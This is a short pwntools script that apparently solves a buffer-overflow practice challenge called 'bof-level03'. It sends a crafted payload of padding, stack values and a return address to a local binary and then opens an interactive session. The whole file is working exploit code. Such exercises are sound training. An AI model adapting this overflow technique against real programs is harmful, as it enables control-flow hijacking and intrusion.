from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

payload = '\x80\x06\x40\x00\x00\x00\x00\x00' + 'A' * 24 + '?@ABCDEFbcdefghi' + ('A' * 8) + '\x80\x06\x40\x00\x00\x00\x00\x00' 

target = process('./bof-level03')

# gdb.attach(target, 'b *receive_input + 399')

# target.recvline()

target.send(payload) 

target.interactive()
